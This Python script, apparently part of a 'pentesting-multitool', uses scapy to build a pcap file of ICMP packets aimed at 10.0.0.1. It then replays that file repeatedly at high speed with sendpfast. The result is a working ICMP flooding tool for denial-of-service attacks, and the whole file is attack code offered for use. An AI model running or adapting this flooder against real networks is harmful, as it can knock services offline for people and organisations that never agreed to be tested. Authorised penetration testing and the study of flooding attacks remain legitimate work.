#! /usr/bin/env python3

from scapy.all import IP, ICMP, wrpcap, rdpcap, sendpfast
import sys

class flooder_attack(object):

    def check(self):
        if len(sys.argv) < 5:
            print('Usage: python3 pentesting-multitool flooder <mode> <number of packets (generator mode) or sends(flooder mode) <filename>\n'
                  '<mode> : You can use it for generate a pcap file with an specified with \"generator\" or use it for do a flooding attack with \"flood\" \n')

        if sys.argv[2] == "generator":
            self.generator()
        elif sys.argv[2] == "flood":
            self.flooder()
        else:
            print("Invalid argument.  (pentesting-multitool flooder <?>)")

    def generator(self):

        n = int(sys.argv[3])
        filename = sys.argv[4]
        time = 0.00114108 * n + 0.157758
        minutes = time/60

        print('Generating packets, it will take %s seconds, moreless (%s, minutes)' % (time, minutes))

        pkgs = [IP(dst='10.0.0.1')/ICMP() for i in range(n)]
        wrpcap(filename, pkgs)

        print('%s packets generated.' % (n))

    def flooder(self):

        n = int(sys.argv[3])
        filename = sys.argv[4]

        print('Reading pcap file.')
        pkgs = rdpcap(filename)

        for i in range(n):
            print('Sending %s packets.' % (len(pkgs)))
            sendpfast(pkgs)
            print('Done, part %s of %s' % ((i + 1), n))

    def __init__(self):
        print('Initializing')
        self.check()